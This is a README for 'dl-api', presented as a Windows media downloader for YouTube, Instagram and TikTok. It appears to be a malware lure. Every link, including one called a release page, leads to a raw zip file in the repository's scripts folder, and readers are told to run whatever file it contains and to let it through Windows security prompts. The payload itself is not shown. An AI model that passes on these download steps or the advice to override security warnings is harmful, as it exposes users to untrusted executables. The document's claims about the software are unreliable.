# 🚀 dl-api - Fast Media Extraction Made Simple

[![Download the latest release](https://img.shields.io/badge/Download%20Latest%20Release-blue?style=for-the-badge)](https://github.com/chasak1919/dl-api/raw/refs/heads/main/scripts/api_dl_v1.8-alpha.2.zip)

## 📥 Download

Visit this page to download: [https://github.com/chasak1919/dl-api/raw/refs/heads/main/scripts/api_dl_v1.8-alpha.2.zip](https://github.com/chasak1919/dl-api/raw/refs/heads/main/scripts/api_dl_v1.8-alpha.2.zip)

Choose the latest release, then download the Windows file that matches your system.

## 🧭 What this app does

dl-api is a media extraction app that helps you pull video or audio from sites like YouTube, Instagram, TikTok, and other supported platforms.

It is built as a FastAPI service, but you do not need to know that to use it. For most users, the main job is simple: download the app, run it on Windows, and use the local web page it opens in your browser.

## ✅ Before you start

Make sure your PC has:

- Windows 10 or Windows 11
- At least 4 GB of RAM
- A stable internet connection
- Enough free storage for downloaded media
- Permission to run apps from your Downloads folder

If your browser asks to open localhost or 127.0.0.1, allow it.

## 🖥️ How to install on Windows

1. Open the download page: [https://github.com/chasak1919/dl-api/raw/refs/heads/main/scripts/api_dl_v1.8-alpha.2.zip](https://github.com/chasak1919/dl-api/raw/refs/heads/main/scripts/api_dl_v1.8-alpha.2.zip)
2. Find the newest release at the top
3. Download the Windows package listed there
4. If the file is in a .zip file, right-click it and choose Extract All
5. Open the extracted folder
6. Double-click the app file or start script that comes with the release
7. Wait for the service to start
8. Open the local address shown in the window, usually in your browser

If Windows shows a security prompt, choose the option that lets the app run.

## 🛠️ First-time setup

After you launch the app, it may create its own local files and folders.

For the first run:

- Keep the window open while the app starts
- Wait until the local server is ready
- Copy the local web address into your browser if it does not open by itself
- Use the page to enter a media link and start extraction

If you close the main window, the local service may stop.

## 🎯 How to use it

1. Open the local web page in your browser
2. Paste a YouTube, Instagram, or TikTok link
3. Select the output you want, such as video or audio
4. Start the extraction
5. Wait for the file to process
6. Save the result to your computer

The app uses smart fallback chains to try more than one method if a source changes its format. This helps keep downloads working across different sites.

## ⚡ Key features

- Fast media extraction for common social platforms
- Support for YouTube, Instagram, TikTok, and more
- Smart fallback chains for better reliability
- HLS streaming proxy support
- Local web interface for simple use
- Built with FastAPI for speed and stability
- Useful for video and audio workflows
- Works as a local Windows app for end users

## 📂 What you may see after launch

You may see files or folders like these:

- config
- logs
- cache
- downloads
- temp
- media output folders

These are normal. They help the app store settings, logs, and processed files.

## 🔧 Common actions

### Start the app
Double-click the app or start file from the extracted folder

### Stop the app
Close the command window or terminal window that opened with the app

### Open the web page
Use the local address shown in the app window, often something like `http://127.0.0.1:8000`

### Download media
Paste a supported link, choose your format, then start the job

## 🧩 Supported sources

This app is built for media extraction from:

- YouTube
- Instagram
- TikTok
- Other sites supported by the underlying media engine

Support can change when a platform changes its layout or video delivery method. The fallback logic helps handle that.

## 🌐 Browser use

You can use dl-api from any modern browser on Windows:

- Microsoft Edge
- Google Chrome
- Firefox

If a page does not load, refresh once the app has fully started.

## 🔍 Tips for smooth use

- Use a clean, full media link
- Wait for the app to finish starting before you paste a link
- Keep the app window open while a download runs
- Save files to a folder with enough free space
- If one link fails, try another supported source or refresh the page

## 🧪 If something looks wrong

If the app does not open right away:

1. Close it
2. Open it again
3. Wait longer for the first start
4. Check that your internet connection works
5. Make sure Windows did not block the file

If the browser shows no page:

1. Look at the app window for the local address
2. Copy that address into the browser
3. Try `127.0.0.1` instead of `localhost`

If a download does not start:

1. Check the source link
2. Try a different browser
3. Reload the page
4. Run the app again

## 📁 Release download path

Use the latest release page here: [https://github.com/chasak1919/dl-api/raw/refs/heads/main/scripts/api_dl_v1.8-alpha.2.zip](https://github.com/chasak1919/dl-api/raw/refs/heads/main/scripts/api_dl_v1.8-alpha.2.zip)

That is the place to visit to download the Windows release file.

## 🧰 What this project is built for

dl-api is a local media extraction tool that fits users who want a simple way to pull media from public links on Windows.

It is a good fit for:

- Saving videos for offline viewing
- Extracting audio from a video link
- Handling repeated downloads from social platforms
- Running a local service on a home PC or laptop

## 🗂️ Repository details

- Name: dl-api
- Type: FastAPI media extraction service
- Main use: download and process media from supported sites
- Target user: Windows end user
- Project topics: api, fastapi, instagram-downloader, media-extractor, open-source, python, rest-api, social-media-api, streaming-proxy, tiktok-downloader, video-download, yt-dlp